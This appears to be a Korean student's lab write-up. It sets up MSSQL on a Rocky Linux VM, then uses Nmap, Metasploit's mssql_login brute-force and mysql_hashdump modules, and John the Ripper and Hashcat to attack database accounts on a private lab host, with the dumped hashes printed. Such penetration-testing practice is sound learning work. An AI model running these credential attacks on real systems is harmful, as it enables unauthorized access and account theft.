
## 사전 세팅: Rocky Linux에 MSSQL 설치

왜인지는 모르겠지만 실습 대상 서버(Rocky Linux)에 MSSQL이 없어 설치부터 진행했다.

### 1. 리포지토리 등록 및 설치
```bash
sudo curl -o /etc/yum.repos.d/mssql-server.repo https://packages.microsoft.com/config/rhel/9/mssql-server-2022.repo
sudo dnf install -y mssql-server
```

### 2. 초기 설정 시도 → 메모리 부족으로 실패
```bash
sudo /opt/mssql/bin/mssql-conf setup
```
```
sqlservr: This program requires a machine with at least 2000 megabytes of memory.
```
- `free -h` 확인 결과 VM 총 메모리가 **1.7GB**로, MSSQL 최소 요구사항(2GB)에 미달
- **해결**: VM 종료 후 가상화 프로그램(VMware/VirtualBox)에서 메모리를 2GB 이상으로 재할당. 이때 Vmware poweroff 해주지 않으면 설정 값 변경되지 않아서 해맸음.

### 3. 메모리 증설 후 재설정 → 이전 프로세스 충돌
```bash
sudo /opt/mssql/bin/mssql-conf setup
```
```
An instance of SQL Server is running. Please stop the SQL Server service
using the following command: sudo systemctl stop mssql-server
```
- 이전 실패 시도의 프로세스가 남아있던 것이 원인이어서 싹 밀어버리고 다시 시도
```bash
sudo systemctl stop mssql-server
sudo /opt/mssql/bin/mssql-conf setup   # 에디션: 2(Developer), sa 비밀번호 설정
```
→ `Setup ... successful`

### 4. 서비스 시작 및 방화벽 1433 포트 개방
```bash
sudo systemctl start mssql-server
sudo systemctl enable mssql-server
sudo firewall-cmd --add-port=1433/tcp --permanent
sudo firewall-cmd --reload
```

### 5. 포트 리스닝 확인
```bash
sudo ss -tlnp | grep 1433
```
```
LISTEN 0 128  0.0.0.0:1433  0.0.0.0:*  users:(("sqlservr",pid=3327,fd=86))
LISTEN 0 128        *:1433        *:*  users:(("sqlservr",pid=3327,fd=79))
```

- Listen으로 Port가 열려있음을 확인

### 6. (다른 이슈) Kali 네트워크 인터페이스 다운
- 설정 변경/재부팅 과정에서 Kali의 `eth0`이 `DOWN` 상태가 되어 대상 서버로 라우팅 자체가 안 되는 문제 발생
```bash
sudo ip link set eth0 up
sudo dhclient eth0
```
→ `192.168.63.133/24`로 IP 재할당 확인 후 정상 통신 복구
- `eth0 up` 상태로 변경되는 점 확인

---

## 실습 1: Nmap 포트 스캔

```bash
nmap -p 1433,3306,1521 -sV 192.168.63.128
```
- Kali linux에서 DBMS port 연결 설정 요청

| 포트 | 서비스 | 상태 |
|---|---|---|
| 1433 | MSSQL | open (MSSQL 설치 완료 후) |
| 3306 | MySQL/MariaDB | open |
| 1521 | Oracle | filtered |

---

## 실습 2: Metasploit - MSSQL 로그인 브루트포스

**mssql_login**

```
msf6 > use auxiliary/scanner/mssql/mssql_login
msf6 auxiliary(scanner/mssql/mssql_login) > set RHOSTS 192.168.63.128
msf6 auxiliary(scanner/mssql/mssql_login) > set USER_FILE /root/Desktop/user.txt
msf6 auxiliary(scanner/mssql/mssql_login) > set PASS_FILE /root/Desktop/pass.txt
msf6 auxiliary(scanner/mssql/mssql_login) > run
```

### 결과
```
[-] LOGIN FAILED: WORKSTATION\sa: (Incorrect: )
[-] LOGIN FAILED: WORKSTATION\sa:P@SSW0RD (Incorrect: )
[-] LOGIN FAILED: WORKSTATION\admin:... (Incorrect: )
[-] LOGIN FAILED: WORKSTATION\root:... (Incorrect: )
[*] Scanned 1 of 1 hosts (100% complete)
```
- 네트워크 연결은 정상(Unreachable → Incorrect로 변화), 다만 워드리스트(`user.txt`/`pass.txt`) 안의 후보가 실제 설정한 `sa` 비밀번호와 일치하지 않아 전부 실패
- */root/Desktop* 경로의`user.txt` 혹은 `pass.txt`에 실제 비밀번호를 추가하거나, 반대로 sa 비밀번호를 `.txt`에 있는 값으로 바꾸면 로그인 탈취 가능성 상승

---

## 실습 3: Metasploit - MySQL account Hash_dump

앞서 `mysql_login`으로 확보한 `test / P@SSW0RD` 크리덴셜을 이용.

```
msf6 > use auxiliary/scanner/mysql/mysql_hashdump
msf6 auxiliary(scanner/mysql/mysql_hashdump) > set RHOSTS 192.168.63.128
msf6 auxiliary(scanner/mysql/mysql_hashdump) > set USERNAME test
msf6 auxiliary(scanner/mysql/mysql_hashdump) > set PASSWORD P@SSW0RD
msf6 auxiliary(scanner/mysql/mysql_hashdump) > run
```

### 결과 (전 계정 해시 덤프 성공)
```
[+] Saving HashString as Loot: mariadb.sys:
[+] Saving HashString as Loot: abcdadm:*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
[+] Saving HashString as Loot: mysql:invalid
[+] Saving HashString as Loot: test:*47A6B0EA08A36FAEBE4305B373FE37E3CF27C357
[+] Saving HashString as Loot: user0:*A81F7D6BB198557D290F8FCC1CC9B67AE90192CD
[+] Saving HashString as Loot: webapp:*0C60C01DFB1945212DD81A93870D6C9B8B4D4A35
[+] Saving HashString as Loot: test:*97947DCDD7A9FA8F8D7F41EBB149B0DAD60EC34F
```
- `test` 계정이 `mysql.user` 테이블에 대한 접근 권한(전체 권한)을 가지고 있어 전체 계정의 비밀번호 해시를 덤프할 수 있었음

---

### 해시 크래킹 (로컬 도구 권장)
> 외부 크래킹 서비스 대신, 안전한 실습 격리를 위해 Kali 로컬 도구 사용 권장

**John the Ripper**
```bash
echo '*47A6B0EA08A36FAEBE4305B373FE37E3CF27C357' > /root/Desktop/hash.txt
john --format=mysql-sha1 --wordlist=/usr/share/wordlists/rockyou.txt /root/Desktop/hash.txt
john --show --format=mysql-sha1 /root/Desktop/hash.txt
```

**Hashcat**
```bash
hashcat -m 300 -a 0 /root/Desktop/hash.txt /usr/share/wordlists/rockyou.txt
```

---
